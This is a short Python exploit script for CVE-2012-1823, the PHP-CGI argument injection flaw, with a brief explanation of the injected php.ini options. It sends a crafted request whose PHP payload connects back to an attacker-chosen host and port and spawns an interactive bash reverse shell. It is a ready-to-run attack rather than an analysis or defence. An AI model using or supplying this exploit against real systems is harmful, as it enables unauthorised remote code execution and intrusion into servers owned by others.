import requests
import sys

"""
CVE-2012-1823
Exploit DB: https://www.exploit-db.com/exploits/18836/
Metasploit: https://www.rapid7.com/db/modules/exploit/multi/http/php_cgi_arg_injection
"""

"""
Details
-------
Because the php CGI input is unsanitized, additional options can be passed with the `-d` flag to overwrite the propreties specified in /etc/php5/cgi/php.ini'. Specifically the required options are:
1. allow_url_include=on
   - This options allows the inclusion of php scripts from outside the `include_path`
   - This assumes that `allow_url_fopen = on`, which is a prerequisite
2. auto_prepend_file=php://input
   - This allows the response body to be parsed and executed by the CGI php interpreter before the intended CGI executable/script (if there even is one)
"""

RHOST = sys.argv[1]
RPORT = 80
LHOST = sys.argv[2]
LPORT = 80
CGI_URI = '/?-dallow_url_include%3don+-dauto_prepend_file%3dphp://input'


CODE = '<?php $s=fsockopen("{}",{});passthru("nohup /bin/bash -i <&4 >&4 2>&4 &");?>'.format(LHOST,LPORT)

requests.get('http://'+RHOST+':'+str(RPORT)+CGI_URI,
             data=CODE)
